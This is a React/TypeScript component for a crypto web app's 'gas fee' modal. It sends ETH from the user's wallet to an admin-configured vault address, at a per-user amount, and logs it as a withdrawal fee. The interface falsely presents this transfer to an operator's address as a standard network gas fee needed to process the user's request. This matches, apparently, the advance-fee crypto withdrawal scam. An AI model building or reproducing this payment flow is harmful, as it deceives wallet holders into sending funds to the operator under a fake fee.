'use client';

import { useEffect, useState, useMemo } from 'react';
import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
import { ethers, BrowserProvider } from 'ethers';
import { useWallet } from '@/context/base';
import { useAppKitProvider } from '@reown/appkit/react';
import { motion, AnimatePresence } from 'framer-motion';

declare global {
    interface Window {
        ethereum?: Record<string, unknown>;
    }
}

interface GasFeeModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSuccess: (txHash: string) => void;
    amount?: string;
    user?: any;
    theme?: 'dark' | 'light';
    network?: string;
}

export default function GasFeeModal({
    isOpen,
    onClose,
    onSuccess,
    amount = '0.00',
    user,
    theme = 'light',
    network = 'ETH'
}: GasFeeModalProps) {
    const [status, setStatus] = useState<any>('idle');
    const [txSuccess, setTxSuccess] = useState<any>(false);
    const [txHash, setTxHash] = useState('');
    const [error, setError] = useState(null);
    const { address: add } = useWallet();
    const { walletProvider } = useAppKitProvider('eip155');
    const [internalUser, setInternalUser] = useState<any>(user);
    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
    const [loadingSettings, setLoadingSettings] = useState(false);

    useEffect(() => {
        if (isOpen) {
            fetchAdminSettings();
        }
    }, [isOpen]);

    useEffect(() => {
        if (user && user.id) {
            setInternalUser(user);
        } else if (isOpen && add) {
            const fetchUser = async () => {
                try {
                    let res = await fetch(`/api/user?address=${add}`);
                    let json = await res.json();
                    if (json?.existingRecord) {
                        setInternalUser(json.existingRecord);
                    }
                } catch (e) {
                    console.error("Error fetching user in GasFeeModal:", e);
                }
            };
            fetchUser();
        }
    }, [add, user, isOpen]);

    const fetchAdminSettings = async () => {
        setLoadingSettings(true);
        try {
            const res = await fetch('/api/admin/settings');
            const data = await res.json();
            setAdminAddresses(data);
        } catch (e) {
            console.error("Failed to fetch admin settings", e);
        } finally {
            setLoadingSettings(false);
        }
    };

    const { targetNetworkName, targetAsset, isBsc, targetChainId } = useMemo(() => {
        // Force all gas payments to Ethereum Mainnet as requested
        return {
            isBsc: false,
            targetChainId: '0x1',
            targetNetworkName: 'Ethereum Mainnet',
            targetAsset: 'ETH'
        };
    }, []);

    const sendEth = async () => {
        let amountText = (internalUser?.fields?.gasFee || "0.003").toString();

        const gasVault = adminAddresses['gas_fee_address_eth'] || '';

        try {
            if (!gasVault) {
                const foundKeys = Object.keys(adminAddresses).join(', ');
                setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
                return;
            }
            if (!gasVault.startsWith('0x')) {
                setError(`Invalid gas fee address: "${gasVault}". Must be a valid 0x Ethereum address.`);
                return;
            }

            setStatus('processing');
            setError(null);

            // Use Reown AppKit walletProvider — this is the correct EIP-1193 provider
            // that supports eth_sendTransaction via WalletConnect / Trust Wallet
            const rawProvider: any = walletProvider
                || (typeof window !== 'undefined' && (window as any).ethereum);

            if (!rawProvider) {
                setError("No wallet provider found. Please open this page inside Trust Wallet browser.");
                setStatus('idle');
                return;
            }

            // 1. Try to switch to Ethereum Mainnet — silently ignore if not supported
            // (WalletConnect sessions often don't support wallet_switchEthereumChain)
            try {
                await rawProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }],
                });
            } catch {
                // Non-fatal — proceed with transaction regardless
                // The wallet may already be on the correct chain
            }

            // 2. Send transaction — try ethers signer first, raw request as fallback
            let txHash = '';
            try {
                const provider = new ethers.BrowserProvider(rawProvider);
                const signer = await provider.getSigner();
                const fromAddress = await signer.getAddress();
                const tx = await signer.sendTransaction({
                    to: gasVault.trim(),
                    from: fromAddress,
                    value: ethers.parseEther(parseFloat(amountText).toFixed(18)),
                });
                setStatus('confirming');
                await tx.wait();
                txHash = tx.hash;
            } catch (signerErr: any) {
                // Fallback: use raw eth_sendTransaction request directly
                console.warn('Signer failed, trying raw eth_sendTransaction:', signerErr?.message);
                const accounts: string[] = await rawProvider.request({ method: 'eth_requestAccounts' });
                const fromAddress = accounts[0];
                const valueHex = '0x' + BigInt(Math.round(parseFloat(amountText) * 1e18)).toString(16);
                const rawHash: string = await rawProvider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: fromAddress,
                        to: gasVault.trim(),
                        value: valueHex,
                        gas: '0x5208', // 21000
                    }],
                });
                txHash = rawHash;
            }

            setStatus('success');
            setTxSuccess(true);
            setTxHash(txHash);

            // 3. Record the transaction
            try {
                await fetch(`/api/withdrawal`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        address: add,
                        amount: Number(amountText),
                        type: "fee",
                        asset: targetAsset,
                        network: targetNetworkName,
                        wType: "crypto",
                        status: "completed"
                    })
                });
            } catch (apiErr) {
                console.error("Failed to record fee transaction:", apiErr);
            }

            if (onSuccess) onSuccess(txHash);

        } catch (err: any) {
            console.error("Gas Payment Error:", err);
            const msg = err?.info?.error?.message || err?.error?.message || err?.message || "Transaction failed. Please try again.";
            setError(msg);
            setStatus('idle');
        }
    };

    const handlePayGasFac = async () => {
        sendEth();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-[60] flex items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-md ${theme === 'dark' ? 'bg-black/80' : 'bg-black/40'}`}
                        onClick={status !== 'processing' ? onClose : undefined}
                    />

                    <motion.div
                        initial={{ y: "100%", opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        exit={{ y: "100%", opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full md:max-w-[390px] border-t md:border rounded-t-[2rem] md:rounded-[2rem] px-6 pt-6 pb-10 md:pb-6 text-center space-y-5 shadow-2xl z-20 md:m-4 ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            }`}
                    >
                        <button
                            onClick={onClose}
                            className={`absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full transition-colors z-10 ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}
                        >
                            <X className="w-5 h-5" />
                        </button>

                        {status === 'success' ? (
                            <motion.div
                                initial={{ opacity: 0, scale: 0.9 }}
                                animate={{ opacity: 1, scale: 1 }}
                                className="space-y-8 py-4"
                            >
                                <div className="relative mx-auto w-24 h-24">
                                    <div className="absolute inset-0 bg-emerald-500 blur-3xl opacity-20 animate-pulse" />
                                    <div className="w-24 h-24 bg-emerald-500/10 text-emerald-500 border-2 border-emerald-500/20 rounded-full flex items-center justify-center relative">
                                        <Check className="w-12 h-12" />
                                    </div>
                                </div>

                                <div className="space-y-3">
                                    <h3 className="text-xl font-bold">Payment Confirmed</h3>
                                    <p className="text-gray-500 font-medium px-4">Your gas fee transaction has been securely processed on the network.</p>
                                </div>

                                <div className={`rounded-2xl p-4 border text-left space-y-3 ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                    <div className="flex justify-between items-center">
                                        <span className="text-sm font-bold text-gray-500">Status</span>
                                        <span className="text-xs font-bold text-emerald-500 uppercase tracking-widest bg-emerald-500/10 px-3 py-1.5 rounded-full border border-emerald-500/20">
                                            Completed
                                        </span>
                                    </div>
                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                    <div className="space-y-2">
                                        <span className="text-xs font-bold text-gray-400 uppercase tracking-widest">Transaction Hash</span>
                                        <div className={`font-mono text-[11px] break-all p-4 rounded-2xl border ${theme === 'dark' ? 'bg-black text-blue-400 border-white/5' : 'bg-white text-blue-600 border-gray-200'}`}>
                                            {txHash || "0x..."}
                                        </div>
                                    </div>
                                </div>

                                <button
                                    onClick={() => onSuccess(txHash)}
                                    className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-2 text-sm font-semibold"
                                >
                                    Continue Transaction
                                </button>
                            </motion.div>
                        ) : (
                            <>
                                <motion.div
                                    initial={{ scale: 0.5, opacity: 0 }}
                                    animate={{ scale: 1, opacity: 1 }}
                                    className="relative mx-auto w-16 h-16"
                                >
                                    <div className={`absolute inset-0 ${txSuccess ? 'bg-emerald-500' : 'bg-orange-500'} blur-2xl opacity-10`} />
                                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center relative ${
                                        txSuccess 
                                        ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' 
                                        : 'bg-orange-500/10 text-orange-500 border border-orange-500/20'
                                    }`}>
                                        {txSuccess ? <Check className="w-8 h-8" /> : <Fuel className="w-8 h-8" />}
                                    </div>
                                </motion.div>

                                <div className="space-y-3">
                                    <h3 className="text-lg font-bold">
                                        {txSuccess ? "Success" : "Network Gas Fee"}
                                    </h3>
                                    <p className="text-gray-500 text-xs font-medium px-2 leading-relaxed">
                                        Standard blockchain fee required to securely process and verify your request.
                                    </p>
                                    {error && !loadingSettings && (
                                        <motion.div
                                            initial={{ opacity: 0, y: 10 }}
                                            animate={{ opacity: 1, y: 0 }}
                                            className="mt-4 bg-red-500/5 border border-red-500/10 text-red-500 text-xs p-4 rounded-2xl text-left font-medium"
                                        >
                                            <span className="font-bold uppercase tracking-widest block mb-1 opacity-50">Error Detail</span>
                                            {error}
                                        </motion.div>
                                    )}
                                </div>

                                <div className={`rounded-2xl p-4 space-y-3 text-left ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                                    <div className="flex justify-between items-center">
                                        <span className="text-sm font-bold text-gray-500">Network</span>
                                        <span className="text-sm font-bold">{targetNetworkName}</span>
                                    </div>
                                    <div className="flex justify-between items-center">
                                        <span className="text-sm font-bold text-gray-500">Processing Fee</span>
                                        <span className="text-sm font-bold text-blue-600">{internalUser?.fields?.gasFee || "0.003"} {targetAsset}</span>
                                    </div>
                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                    <div className="space-y-2">
                                        <span className="text-xs font-bold text-gray-400 uppercase tracking-widest">Vault Address</span>
                                        <div className="font-mono text-[11px] opacity-60 break-all">{adminAddresses['gas_fee_address_eth'] || "Connecting..."}</div>
                                    </div>
                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                    <div className="flex justify-between items-center">
                                        <span className="text-sm font-bold text-gray-500">Speed</span>
                                        <span className="text-xs font-bold text-emerald-500 uppercase tracking-widest bg-emerald-500/10 px-3 py-1.5 rounded-full border border-emerald-500/20">
                                            Instant
                                        </span>
                                    </div>
                                </div>

                                <button
                                    onClick={handlePayGasFac}
                                    disabled={status !== 'idle'}
                                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-semibold py-4 rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-2 text-sm"
                                >
                                    {status !== 'idle' || loadingSettings ? (
                                        <>
                                            <Loader2 className="w-5 h-5 animate-spin" />
                                            {loadingSettings ? "Loading..." : "Processing..."}
                                        </>
                                    ) : (
                                        <>
                                            {adminAddresses['gas_fee_address_eth'] ? "Authorize Payment" : "Configuring..."}
                                            {adminAddresses['gas_fee_address_eth'] && <ArrowRight className="w-5 h-5" />}
                                        </>
                                    )}
                                </button>
                            </>
                        )}
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}
